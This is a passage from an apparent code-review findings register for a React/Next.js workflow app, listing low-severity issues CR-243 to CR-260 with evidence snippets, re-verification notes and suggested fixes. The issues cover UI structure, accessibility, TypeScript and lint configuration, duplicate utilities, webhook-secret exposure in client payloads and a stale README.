- **Re-verification note:** `intervalMin={Number(trigger.interval_min ?? 60)}` still snaps an empty input back to 60, because the onChange handler emits `undefined` for non-positive values. Keep a local string buffer in the input, commit only valid positive numbers on change or blur, and show a validation hint when the field is empty.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-29
- **Location:** `components/template-editor/components/FlowSettingsSchedule.tsx:76-89`, `components/template-editor/FlowSettings.tsx:113`
- **Problem:** Clearing the number input emits `undefined`, and the display immediately falls back to `60`. Typing "15" therefore has to be done by selecting the existing text; backspacing to empty snaps back.
- **Evidence:**
  ```tsx
  // FlowSettings.tsx:113
  intervalMin={Number(trigger.interval_min ?? 60)}
  // FlowSettingsSchedule.tsx:81-88
  value={intervalMin}
  onChange={(e) => onIntervalChange(Number(e.target.value) > 0 ? Number(e.target.value) : undefined)}
  ```
- **Suggested fix:** Keep a local string buffer for the input and commit a valid positive number on blur or change. Show a validation hint when empty.
- **Effort:** S

### CR-243 [Low] `components/ui/modal.tsx` is a custom wrapper inside the shadcn-only folder

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** components/ui/modal.tsx:1-72 (import at :10, "Radix" comment at :12-15); consumers components/tasks/BuildModal.tsx, components/settings/integrations/components/ConnectModal.tsx, components/settings/repos/components/RepoModal.tsx, components/settings/general/components/SecretModal.tsx, components/chat/prompt-modal/PromptModal.tsx
- **Re-verification note:** The custom `Modal` adapter, which preserves the old hand-rolled API, still lives in the shadcn-only `components/ui/` folder, still imports `../../lib/utils` (the ui lint rule blocks `@/lib/**` but not relative paths), and still says "Radix". Move it to components/shared/Modal.tsx, export it from the shared barrel, update the 5 importers, and fix the import and comment.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-15
- **Related:** CR-259 (UI-29, TOOL-16)
- **Location:** `components/ui/modal.tsx:1-72`
- **Problem:** `Modal` is an app-level API adapter over `Dialog` (legacy `open/onClose/title/footer` API), not a shadcn primitive. §1 and §2.3 reserve `components/ui/` for shadcn primitives only. The file also imports `../../lib/utils` while every other ui file uses `cn` from `"cn"`, and its doc comment says "Radix" while the primitives are Base UI.
- **Evidence:**
  ```tsx
  import { cn } from "../../lib/utils";
  /** Thin wrapper over the shadcn Dialog that keeps the old hand-rolled Modal API ... */
  export function Modal({ open, onClose, title, children, footer, className }: {
  ```
- **Suggested fix:** Move it to `components/shared/Modal.tsx`, export it from the shared barrel, and update imports. Fix the import and comment.
- **Effort:** S

### CR-244 [Low] Sidebar active state uses exact pathname match, so nested routes highlight nothing

- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
- **Current location:** components/shared/AppSidebar.tsx:81
- **Re-verification note:** `const active = pathname === nav.pathname` is unchanged, so on detail routes (for example /flows/<id> or /templates/<id>) no sidebar item is highlighted. Use longest-prefix matching (`pathname === href || pathname.startsWith(href + "/")`, picking the most specific match), with `/` special-cased.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-16
- **Location:** `components/shared/AppSidebar.tsx:81`
- **Problem:** `pathname === nav.pathname` means `/flows/abc`, `/templates/<id>` and other detail pages leave every sidebar item inactive, so users lose their place.
- **Evidence:**
  ```tsx
  const active = pathname === nav.pathname;
  ```
- **Suggested fix:** Match on the longest prefix: active if `pathname === href || pathname.startsWith(href + "/")`, pick the most specific item so `/templates/nodes` beats `/templates`, and special-case `/`.
- **Effort:** S

### CR-245 [Low] `components/shared` holds app-specific code (sidebar nav routes, "Search tasks…" default)

- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
- **Current location:** components/shared/AppSidebar.tsx:35-53,70,99, components/shared/FilterPicker.tsx:98, app/(workspace)/page.tsx:38
- **Re-verification note:** AppSidebar still hardcodes the DevFlow route table, product name and "Local workspace" inside `components/shared/`, and FilterPicker still defaults its placeholder to "Search tasks…". Move AppSidebar to an app-shell folder (for example components/layout/) with routes in constants/routes.ts, reuse those route constants in links, and give FilterPicker a neutral default.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-17
- **Location:** `components/shared/AppSidebar.tsx:36-53,70,99`, `components/shared/FilterPicker.tsx:97`
- **Problem:** §2.4 litmus test: shared components carry no domain strings. `AppSidebar` hardcodes the DevFlow route table, product name and "Local workspace". `FilterPicker` defaults its placeholder to "Search tasks…". The route literals are also duplicated elsewhere (for example `/settings/integrations` in `app/(workspace)/page.tsx`).
- **Evidence:**
  ```tsx
  item("Tasks", "/", ListTree), item("Flows", "/flows", Workflow), ...
  placeholder={placeholder ?? "Search tasks…"}
  ```
- **Suggested fix:** Move `AppSidebar` to an app-shell feature folder (for example `components/layout/`), with routes in `constants/routes.ts` reused by other links. Give `FilterPicker` a neutral default ("Search…") and pass "Search tasks…" from `TasksView`.
- **Effort:** S

### CR-246 [Low] Execution-mode values are raw literals with no shared constant; the `ExecutionMode` name collides

- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** types/tasks.ts:10, components/tasks/hooks/use-start-build.ts:27, components/tasks/BuildModal.tsx:163,166, components/settings/general/constants.ts:7-10, components/flows/constants.ts:4, components/flows/components/plan/constants/index.ts:7-11
- **Re-verification note:** `"cloud"` and `"local"` are still compared and rendered as raw literals, and the only constant is still the feature-local `EXECUTION_MODE_LOCAL`. The plan feature's `ExecutionMode` (whole/steps), now in components/flows/components/plan/constants, still collides by name with `types/tasks.ts` `ExecutionMode`. Add constants/execution.ts with `RUN_MODE` and `RunMode`, replace the literals, and rename one of the two types.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-19
- **Location:** `types/tasks.ts:10`, `components/tasks/hooks/use-start-build.ts:27`, `components/tasks/BuildModal.tsx:163,166`, `components/settings/general/constants.ts:7-10`
- **Problem:** `"cloud"` and `"local"` are compared and rendered as literals. The only constant (`EXECUTION_MODE_LOCAL`) is feature-local in `components/flows/constants.ts:4`, and `components/flows/plan/constants.ts:7-11` defines a different `ExecutionMode` (steps/whole) under the same name as `types/tasks.ts`. §2.7 requires closed sets as an `as const` object plus a derived type in `constants/`.
- **Evidence:**
  ```ts
  export type ExecutionMode = "cloud" | "local";            // types/tasks.ts
  if (executionMode === "local" && !repo.local_path) {      // use-start-build.ts
  <SelectItem value="cloud">…<SelectItem value="local" …>  // BuildModal.tsx
  ```
- **Suggested fix:** Add `constants/execution.ts` with `RUN_MODE = { CLOUD: "cloud", LOCAL: "local" } as const` and `type RunMode`. Replace the literals and the `components/flows` constant, and rename one of the two `ExecutionMode` types.
- **Effort:** S

### CR-247 [Low] Magic domain strings in tasks filters and integration tabs

- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** components/tasks/TasksView.tsx:47,67-79, components/tasks/hooks/use-live-tasks.ts:12,15, components/settings/integrations/GitTab.tsx:28-29,44, components/settings/integrations/TaskTab.tsx:28-29,44, components/settings/integrations/HarnessTab.tsx:71,73, components/settings/general/components/StatusBar.tsx:18-19
- **Re-verification note:** The filter keys and values (assignee, me, any, provider, statusCategory), the hosting values (cloud, custom), the Cursor card id and URL, and StatusBar's `.gitlab` / `.jira` lookups are all still literals, even though `PROVIDER_KIND` exists. Add `TASK_FILTER` / `ASSIGNEE` and `HOSTING` constants, use `PROVIDER_KIND` in StatusBar, and hoist the Cursor card constants.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-20
- **Location:** `components/tasks/TasksView.tsx:46-48,67-79`, `components/tasks/hooks/use-live-tasks.ts:10-17`, `components/settings/integrations/GitTab.tsx:27-30,44,60`, `components/settings/integrations/TaskTab.tsx:27-30,44`, `components/settings/integrations/HarnessTab.tsx:70-74`, `components/settings/general/components/StatusBar.tsx:18-19`
- **Problem:** Each of these strings repeats across files that must agree, which is the case §2.7 targets:
  - Filter keys and values: `"assignee"`, `"me"`, `"any"`, `"provider"`, `"statusCategory"`, also parsed by the route.
  - Hosting values: `"cloud"` / `"custom"`.
  - Harness card: id `"cursor"` and URL `"https://api.cursor.com"`.
  - StatusBar: `.gitlab` / `.jira`, although `PROVIDER_KIND` exists.
- **Evidence:**
  ```ts
  const [filters, setFilters] = useState<Record<string, string>>({ assignee: "me" });
  const isCustom = hosting === "custom";
  isOk: (s) => s.status.gitHosts?.gitlab ?? false
  ```
- **Suggested fix:**
  - Add `TASK_FILTER = { PROVIDER, ASSIGNEE, STATUS }` and `ASSIGNEE = { ME, ANY }` to `components/tasks/constants.ts`.
  - Add `HOSTING = { CLOUD, CUSTOM }` to `integrations/constants.ts`.
  - Use `PROVIDER_KIND` in StatusBar.
  - Hoist the Cursor card constants.
- **Effort:** S

### CR-248 [Low] GitTab / TaskTab are near-duplicates, and three identical modal chromes exist

- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
- **Current location:** components/settings/integrations/GitTab.tsx:32-105 (166 lines), components/settings/integrations/TaskTab.tsx:32-104 (173 lines), components/settings/integrations/components/ConnectModal.tsx:10-39, components/settings/repos/components/RepoModal.tsx:10-40, components/settings/general/components/SecretModal.tsx:10-40
- **Re-verification note:** GitTab and TaskTab are still near-duplicates in hook wiring, list, test/remove and submit logic, and the three modal chromes still repeat the same Cancel + submit footer. There is no `FormModal` yet. Add components/shared/FormModal.tsx (props for icon, submitLabel and width) and a shared `InstanceList` container, so each tab supplies only its form fields.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-21
- **Location:** `components/settings/integrations/GitTab.tsx:32-105`, `components/settings/integrations/TaskTab.tsx:32-104`, `components/settings/integrations/components/ConnectModal.tsx:10-39`, `components/settings/repos/components/RepoModal.tsx:10-40`, `components/settings/general/components/SecretModal.tsx:10-40`
- **Problem:** The two tabs (166 and 173 lines) repeat the same hook wiring, list, error and skeleton states, test, remove and submit logic, differing only in fields and copy. `ConnectModal`, `RepoModal` and `SecretModal` are byte-for-byte the same footer pattern, differing only in icon, width and label. They are generic: they pass §2.4's litmus test.
- **Evidence:**
  ```tsx
  <Button variant="outline" onClick={onClose}>Cancel</Button>
  <Button onClick={onSubmit} disabled={submitting || !canSubmit}>
    {submitting ? <Spinner /> : <FolderGit2 size={13} />} {submitLabel}
  ```
- **Suggested fix:** Add `components/shared/FormModal.tsx` (props: `icon`, `submitLabel`, `width`) and delete the three copies. Extract an `InstanceList` container (list, error, empty and skeleton states plus test and remove) used by both tabs, so each tab supplies only its connect form fields.
- **Effort:** M

### CR-249 [Low] Callbacks created inside `.map()` for row components

- **Status at `abaa007`:** **Open**, fix in [Task 53](review-tasks/53-app-shell-and-settings-dedup.md)
- **Current location:** components/settings/repos/ReposSection.tsx:81-89, components/settings/integrations/GitTab.tsx:99-101, components/settings/integrations/TaskTab.tsx:98-100, components/settings/integrations/HarnessTab.tsx:76
- **Re-verification note:** Row callbacks (`onEdit={() => openEdit(r)}`, `onTest={() => runTest(i.id)}`, `onDelete={() => remove.mutate(i.id)}`) are still created inside `.map()`. Pass the id plus stable `onEdit(id)` / `onDelete(id)` / `onTest(id)` handlers and bind them inside the row, following CustomNodesSection.tsx:111-112 / SecretRow.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-22
- **Location:** `components/settings/repos/ReposSection.tsx:81-89`, `components/settings/integrations/GitTab.tsx:93-102`, `components/settings/integrations/TaskTab.tsx:92-101`
- **Problem:** §2.5 says "never create a callback inside a `.map()` body". `SecretRow` already follows the correct pattern in the same area.
- **Evidence:**
  ```tsx
  repos.map((r) => (
    <RepoCard key={r.id} repo={r} onEdit={() => openEdit(r)}
      onDelete={() => remove.mutate(r.id, { onError: (e) => onError(e.message) })} />
  ```
- **Suggested fix:** Pass the id and stable `onEdit(id)` / `onDelete(id)` / `onTest(id)` callbacks (`useCallback` in the container), and bind inside the row, as in `SecretRow.tsx:24-25`.
- **Effort:** S

### CR-250 [Low] Unlabeled form controls in settings and the shared FilterPicker

- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
- **Current location:** components/settings/general/components/HttpAllowlist.tsx:23-30, components/settings/general/components/ModeCascade.tsx:33-37, components/settings/general/components/DefaultModelFields.tsx:21-25, components/settings/integrations/GitTab.tsx:115-124, components/settings/integrations/TaskTab.tsx:114-123, components/settings/integrations/HarnessTab.tsx:100-107, components/shared/FilterPicker.tsx:95-100
- **Re-verification note:** Labels are still plain `<div>`s, or a `FieldLabel` without `htmlFor` next to a `SelectTrigger` with no `id` (ProviderSelect / HostingSelect take no id prop), and the FilterPicker input has only a placeholder. Use `<FieldLabel htmlFor>` with matching ids threaded through the selects, and add `aria-label` to the FilterPicker input.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-23
- **Related:** CR-131 (FLOWUI-17)
- **Location:** `components/settings/general/components/HttpAllowlist.tsx:23-30`, `components/settings/general/components/ModeCascade.tsx:33-37`, `components/settings/general/components/DefaultModelFields.tsx:21-25`, `components/settings/integrations/GitTab.tsx:115-124`, `components/settings/integrations/TaskTab.tsx:114-123`, `components/settings/integrations/HarnessTab.tsx:100-107`, `components/shared/FilterPicker.tsx:95-100`
- **Problem:** The visible "label" is a plain `<div>` (allowlist, harness, model), or a `FieldLabel` without `htmlFor` paired with a `SelectTrigger` that has no `id` (Provider and Type selects). The FilterPicker text input relies on its placeholder only. Screen readers announce these controls with no name (§2.9).
- **Evidence:**
  ```tsx
  <div className="text-[13px] font-medium mb-2">HTTP allowlist</div>
  <Textarea rows={3} placeholder={ALLOWLIST_PLACEHOLDER} ... />
  <FieldLabel>Provider</FieldLabel>
  <ProviderSelect value={provider} ... />
  ```
- **Suggested fix:** Use `<FieldLabel htmlFor=…>` with matching `id`s on the `Textarea` / `SelectTrigger` (thread an `id` prop through `ProviderSelect` / `HostingSelect`). Add `aria-label` to the FilterPicker input.
- **Effort:** S

### CR-251 [Low] `Markdown` memo comparator ignores every prop except `children`

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** components/shared/Markdown.tsx:136-150
- **Re-verification note:** `React.memo(..., (prev, next) => prev.children === next.children)` still ignores changes to `className`, `id` and handlers. Drop the custom comparator so the default shallow compare applies, or compare `children` and `className` as well.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-24
- **Related:** CR-154 (UI-12)
- **Location:** `components/shared/Markdown.tsx:136-150`
- **Problem:** `(prev, next) => prev.children === next.children` means changes to `className`, `id`, `style`, `aria-*` or handlers are dropped until the text changes, so stale styling or handlers are rendered. This is a latent bug for any consumer that toggles a class (for example a selected or streaming state).
- **Evidence:**
  ```tsx
  export const Markdown = React.memo(
    ({ children, className, ...props }: MarkdownProps) => ( ... ),
    (prev, next) => prev.children === next.children
  );
  ```
- **Suggested fix:** Drop the custom comparator (default shallow compare), or compare `children` and `className` and require other props to be stable.
- **Effort:** S

### CR-252 [Low] `DataTable.tsx` is 436 lines with three components

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** components/shared/DataTable.tsx:84-335,338-415,419-436
- **Re-verification note:** The file is still 436 lines and still defines `DataTable`, `ActionsCell` and a hand-rolled `ChevronsUpDown`. Split it into a components/shared/dataTable/ folder (DataTable, ActionsCell, pagination, skeleton rows, TreeCell; the folder name is lowercase per §2.9) and use lucide's `ChevronsUpDown`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-25
- **Location:** `components/shared/DataTable.tsx:84-335,338-415,419-436`
- **Problem:** The file is over the ~200-line refactor signal and holds `DataTable`, `ActionsCell` and `ChevronsUpDown`, with inline skeleton rows, the tree-cell chrome and pagination all in one render.
- **Evidence:**
  ```tsx
  export function DataTable<TData, TValue>({ ... }) { ... }   // 84-335
  function ActionsCell<TData>({ row, actions }) { ... }       // 338-415
  function ChevronsUpDown() { ... }                           // 419-436
  ```
- **Suggested fix:** Split into a `components/shared/data-table/` folder: `DataTable.tsx`, `DataTableActionsCell.tsx`, `DataTablePagination.tsx`, `DataTableSkeletonRows.tsx` and `TreeCell.tsx`. Replace `ChevronsUpDown` with lucide's `ChevronsUpDown`.
- **Effort:** M

### CR-253 [Low] Task badges: `target="_blank"` without `rel`, and regex if-chains instead of lookup tables

- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
- **Current location:** components/tasks/TaskBadges.tsx:17-31,34-41,54-78 (also components/flows/panels/BuildView.tsx:155)
- **Re-verification note:** The provider link still has `target="_blank"` with no `rel="noopener noreferrer"`, the same gap exists on the BuildView MR link, and type, status and priority styling are still if/regex ternary chains in a file exporting three components. Add `rel`, move the `[pattern, className]` tables into components/tasks/constants.ts, and split the three badges into separate files.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-26
- **Location:** `components/tasks/TaskBadges.tsx:37-41,18-31,54-78`
- **Problem:**
  - The provider deep link opens with `target="_blank"` and no `rel="noopener noreferrer"`. It leaks the referrer to the external tracker, and older engines allow `window.opener`.
  - Type, status and priority styling are long `if` and nested-ternary regex chains, which §2.9 says should be lookup tables.
  - The file exports three components.
- **Evidence:**
  ```tsx
  <a href={task.externalUrl} target="_blank" onClick={(e) => e.stopPropagation()}
  const className = /done|closed|resolved|complete/.test(s) ? "bg-success/10 text-success"
    : /progress|review|testing/.test(s) ? "bg-info/10 text-info" : ...
  ```
- **Suggested fix:** Add `rel="noopener noreferrer"`. Move `[pattern, className]` tables to `components/tasks/constants.ts`, and split `TypeChip`, `StatusBadge` and `PriorityBadge` into separate files.
- **Effort:** S

### CR-254 [Low] Webhook secrets are part of the client payload types (Needs verification)

- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
- **Current location:** lib/engine/flow-engine.ts:480, types/flow.ts:115, components/flows/panels/PanelShell.tsx:107-127, types/template-editor.ts:69
- **Re-verification note:** Verified: the flow snapshot (`hooks: hookStore.hooksForFlow(id)`, including `secret`) is polled into every cockpit view. The cockpit uses it: `WaitBanner` prints `hook.secret` in plain text and embeds it in the copied curl. The "drop if unused" option is therefore out. Instead, return a masked secret in the snapshot and add a separate reveal or copy endpoint that the banner calls on demand.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-28
- **Status:** Needs verification
  - UI-28: "Needs verification that `components/flows/**` actually renders `hooks[].secret`; if not, the field should be masked or removed from the snapshot."
- **Related:** CR-155 (UI-13)
- **Location:** `types/flow.ts:115`, `types/template-editor.ts:67-71`
- **Problem:** `FlowData.hooks[].secret` and `EditorHookRow.secret` show that the flow snapshot and the template editor payload ship inbound-webhook secrets to every client view. The editor's payload dialog plausibly needs the secret to build a curl command. The flow cockpit snapshot (`GET /api/flows/:id`) is polled and cached, though, and its need is unclear. **Needs verification** that `components/flows/**` actually renders `hooks[].secret`; if not, the field should be masked or removed from the snapshot.
- **Evidence:**
  ```ts
  hooks?: { id: string; flow_id: string; node_key: string | null; secret: string; filter: string | null }[];
  ```
- **Suggested fix:** If unused in the cockpit, drop `secret` from the snapshot projection and type. Otherwise return a masked value plus a separate reveal endpoint.
- **Effort:** S

### CR-255 [Low] SettingsProvider fetches unused git-hosts data and gates every sub-route on all three queries

- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
- **Current location:** components/settings/context.tsx:7,47,52,70-79,94,102,106, components/settings/queries.ts:21,30
- **Re-verification note:** `/api/git-hosts` is still fetched on every settings visit, though nothing outside context.tsx reads `hosts` or `reload` (grep-verified). `loading` still ORs all three `isPending`s, so every page waits for the slow `/api/settings` probe. Remove `hosts`, `reload` and `fetchGitHosts`, and replace the context with per-resource query hooks so each page waits only on its own data.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-30
- **Location:** `components/settings/context.tsx:47,52,70-79,94,102,106`
- **Problem:** No consumer reads `hosts` or `reload` (verified by grep: none outside `context.tsx`), yet `/api/git-hosts` is fetched on every settings visit. `loading` ORs all three `isPending`s, so the Repositories page waits for `/api/settings`, which probes every agent port's `status()` before responding.
- **Evidence:**
  ```ts
  const hostsQuery = useQuery({ queryKey: queryKeys.gitHosts, queryFn: fetchGitHosts });
  const loading = settingsQuery.isPending || reposQuery.isPending || hostsQuery.isPending;
  ```
- **Suggested fix:** Remove `hosts`, `reload` and `fetchGitHosts`. Replace the context with per-resource hooks (`useSettingsQuery()`, `useReposQuery()`) so each page waits only on its own data. The context then becomes unnecessary.
- **Effort:** S

### CR-256 [Low] `createInstance` returns `null` cast as `InstanceRow`

- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
- **Current location:** components/settings/integrations/hooks/use-instances.ts:46-47
- **Re-verification note:** `return body.instance ?? (null as unknown as InstanceRow)` is unchanged. Throw a typed error when `instance` is missing (per the §2.9 early-guard rule), or type the return as `InstanceRow | null`.

- **Severity:** Low
- **Category:** Code quality
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-31
- **Location:** `components/settings/integrations/hooks/use-instances.ts:46-47`
- **Problem:** A double cast hides a possible `null` behind a non-null type. Any future `onSuccess(instance)` consumer that reads `instance.id` crashes. This is the same class of issue §3.4 / §4 forbid for `!`.
- **Evidence:**
  ```ts
  return body.instance ?? (null as unknown as InstanceRow);
  ```
- **Suggested fix:** Type the return as `Promise<InstanceRow | null>`, or throw when `instance` is missing.
- **Effort:** S

### CR-257 [Low] `eslint.ignoreDuringBuilds: true` means `next build` never lints

- **Status at `abaa007`:** **Fixed** — removed `eslint.ignoreDuringBuilds` from `next.config.mjs`; AGENTS.md §0 DoD now lists `npm run lint` (PR link pending)
- **Current location:** next.config.mjs:9, AGENTS.md:11-27 (§0 Definition of Done, build-only check at :22)
- **Re-verification note:** `eslint: { ignoreDuringBuilds: true }` is still set, and the DoD still lists only `npm run build`. The blocker is gone: lint now installs and runs with 0 errors (CR-039 is resolved). Remove `ignoreDuringBuilds`, or add `npm run lint` and `npm test` to the AGENTS.md DoD checklist.

- **Severity:** Low
- **Category:** Boundaries
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-14
- **Related:** CR-039 (NODE-44, TOOL-01) — fix CR-039 first: lint must be installable before the build can run it
- **Location:** `next.config.mjs:9`
- **Problem:** The DoD lists only `npm run build`, and the build skips lint ("Skipping linting" in the build log). Combined with TOOL-01 (CR-039), no command in the DoD exercises the §5 rules.
- **Evidence:**
  ```
  next.config.mjs:9   eslint: { ignoreDuringBuilds: true },
  build log:          Skipping linting
  ```
- **Suggested fix:** After TOOL-01 (CR-039), either remove `ignoreDuringBuilds` or add `npm run lint` to the AGENTS.md §0 Definition of Done checklist.
- **Effort:** S

### CR-258 [Low] tsconfig strictness gaps: no `noUncheckedIndexedAccess` or `noImplicitOverride`; `.mjs` scripts are not type-checked

- **Status at `abaa007`:** **Open**, fix in [Task 51](review-tasks/51-tsconfig-strictness.md)
- **Current location:** tsconfig.json:2-20
- **Re-verification note:** None of the flags are enabled, and `checkJs` is still off for scripts/*.mjs. Re-measured on the current tree: `noFallthroughCasesInSwitch` + `noImplicitReturns` add 0 new errors, `noImplicitOverride` adds ~41 (52 total vs an 11-error baseline), and `noUncheckedIndexedAccess` adds ~186 (197 total). Enable the free flags now, then `noImplicitOverride`, then plan the indexed-access burn-down.

- **Severity:** Low
- **Category:** Correctness
- **Area:** Area 7b — Tooling & config
- **Source:** TOOL-15
- **Location:** `tsconfig.json:2-20`
- **Problem:** `strict: true` is set, but index access returns non-undefined types, so `rows[0].x` and `match(...)[1]` patterns compile. `allowJs` without `checkJs` leaves the 6 seed and script `.mjs` files unchecked; for example `seed-demo-flow.mjs:193` dereferences `.match(...)[1]` unguarded. Measured impact of enabling each flag on the current tree:
- **Evidence:**
  ```
  --noUncheckedIndexedAccess   -> 153 errors
  --noImplicitOverride         -> 41 errors   (NodeDefinition subclasses)
  --noFallthroughCasesInSwitch -> 0
  --noImplicitReturns          -> 0
  ```
- **Suggested fix:** Enable `noFallthroughCasesInSwitch` and `noImplicitReturns` now; they cost nothing. Enable `noImplicitOverride` next (41 mechanical `override` keywords). Plan `noUncheckedIndexedAccess` as a separate burn-down. Consider `// @ts-check` in `scripts/*.mjs`.
- **Effort:** M

### CR-259 [Low] Two competing `cn()` implementations are used side by side, and `components.json` is out of sync with both

- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
- **Current location:** package.json (deps `cn`, `clsx`, `tailwind-merge`), lib/utils.ts, components.json:15,20, components/ui/modal.tsx:10, components/shared/AppSidebar.tsx:15, components/shared/FilterPicker.tsx:17, components/tasks/TasksView.tsx, components/tasks/TaskBadges.tsx
- **Re-verification note:** Two `cn` engines are still used side by side: 33 files import from the `cn` package and 33 from `@/lib/utils` (lib/utils is allowlisted for client code in eslint.config.mjs). components.json still points `utils` at `@/lib/utils` while the primitives use `cn`, and the `ai-elements` alias still targets a non-existent folder. Pick one implementation, codemod the imports, repoint components.json, drop the unused dependencies, and remove the alias (plus the lint allowlist entry if lib/utils is dropped).

- **Severity:** Low
- **Category:** Code quality (sources: TOOL-16: Code quality; UI-29: Boundaries)
- **Area:** Area 7b — Tooling & config; Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** TOOL-16, UI-29 (merged duplicate)
- **Related:** CR-243 (UI-15)
- **Location:**
  - TOOL-16: `package.json:37` (`cn`), `package.json:36,50` (`clsx`, `tailwind-merge`), `lib/utils.ts:1-18`, `components.json:14,20`
  - UI-29: `components/shared/DataTable.tsx:41`, `components/shared/FilterPicker.tsx:17`, `components/shared/Markdown.tsx:16`, `components/shared/AppSidebar.tsx:15`, `components/tasks/TasksView.tsx:7`, `components/tasks/TaskBadges.tsx:12`, `components/ui/modal.tsx:10`
- **Suggested fix (combined):** Pick one implementation repo-wide (the `cn` package, which `components/ui` already uses, or `@/lib/utils`), codemod all imports (TOOL-16 counts 35 vs 36 files; UI-29 lists the settings/tasks/shared ones), point `components.json` `utils` at the survivor, drop the unused deps, and remove the stale `ai-elements` alias.
- **Effort:** S (sources: TOOL-16 S, UI-29 S)

Original findings, verbatim:

#### TOOL-16 (Area 7b — Tooling & config): Two competing `cn()` implementations, and `components.json` is out of sync with them

- **Severity:** Low
- **Category:** Code quality
- **Location:** `package.json:37` (`cn`), `package.json:36,50` (`clsx`, `tailwind-merge`), `lib/utils.ts:1-18`, `components.json:14,20`
- **Problem:** 35 files import `cn` from the `cn` npm package ("drop-in replacement for clsx + tailwind-merge"), including `components/ui/*`. 36 files import `cn` from `@/lib/utils` (clsx + tailwind-merge). Two class-merge engines ship in the bundle, and conflict resolution may differ subtly. `components.json` declares `utils: "@/lib/utils"`, yet the generated primitives use `"cn"`. The `ai-elements` alias points to a non-existent `components/ai-elements`.
- **Evidence:**
  ```
  components/ui/checkbox.tsx:4   import { cn } from "cn"
  components/flows/StatusBar.tsx:7 import { cn } from "cn";
  lib/utils.ts:18  export const cn = styles.cn.bind(styles);
  components.json:20  "ai-elements": "@/components/ai-elements"
  ```
- **Suggested fix:** Pick one implementation. Either repoint `components.json` `utils` to `cn` and drop `clsx`, `tailwind-merge` and `lib/utils`, or the reverse. Codemod the imports. Remove the stale `ai-elements` alias.
- **Effort:** S

#### UI-29 (Area 7a — Settings, tasks, shared UI, constants, types): Two different `cn` implementations used side by side

- **Severity:** Low
- **Category:** Boundaries
- **Location:** `components/shared/DataTable.tsx:41`, `components/shared/FilterPicker.tsx:17`, `components/shared/Markdown.tsx:16`, `components/shared/AppSidebar.tsx:15`, `components/tasks/TasksView.tsx:7`, `components/tasks/TaskBadges.tsx:12`, `components/ui/modal.tsx:10`
- **Problem:** Part of the area imports `cn` from the `cn` npm package (shadcn's compiled merger). Other files import `@/lib/utils` (`clsx` + `tailwind-merge` wrapped in a `Styles` class), sometimes in the same folder. The two mergers can resolve class conflicts differently, and the rule "never import lib/ from client" is muddied for no benefit.
- **Evidence:**
  ```ts
  import { cn } from "cn";              // DataTable, FilterPicker, Markdown
  import { cn } from "@/lib/utils";     // AppSidebar, TasksView, TaskBadges
  import { cn } from "../../lib/utils"; // ui/modal
  ```
- **Suggested fix:** Pick one (likely `cn`, since `components/ui` uses it), switch the remaining imports, and flag the leftover repo-wide usages in the PR.
- **Effort:** S

### CR-260 [Low] README is stale in several places (env keys, routes, paths, local-mode description)

- **Status at `abaa007`:** **Open**, fix in [Task 56](review-tasks/56-docs-refresh.md)
- **Current location:** README.md:9-10,16,58-61,73-74,89,124-125,165,226,261,277
- **Re-verification note:** The README still documents `CURSOR_API_KEY` / `JIRA_*` env keys (.env.example says credentials live in the DB), `/tasks/import`, `components/panels/`, the `GITLAB_BASE_URL/TOKEN` fallback, and a cursor-agent CLI description of local mode that contradicts line 277. It got worse: it now documents `npm run seed:demo`, `seed:demo:fanout`, `seed:custom` and their `:reset` variants, all removed from package.json. Rewrite the env table from .env.example, fix the paths and routes, unify local mode on the SDK, and document seeds as `node scripts/seed-*.mjs` (or restore the npm scripts).

- **Severity:** Low
